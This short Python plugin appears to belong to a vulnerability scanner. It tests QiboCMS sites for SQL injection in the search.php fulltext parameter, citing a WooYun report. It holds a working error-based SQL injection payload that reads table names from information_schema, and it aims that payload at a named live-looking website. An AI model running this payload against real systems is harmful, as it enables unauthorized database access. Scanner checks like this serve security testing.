#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2010-0115138

def assign(service, arg):
    if service == "qibocms":
        return True, arg
        
def audit(arg):
    payload = "/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11%29%20and%201=2%20union%20select%201%20from%20%28select%20count%28*%29,concat%28md5%281234%29,%20floor%28rand%280%29*2%29,%28select%20table_name%20from%20information_schema.tables%20where%20table_schema=database%28%29%20limit%200,1%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%23"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.igea-un.org/')[1])
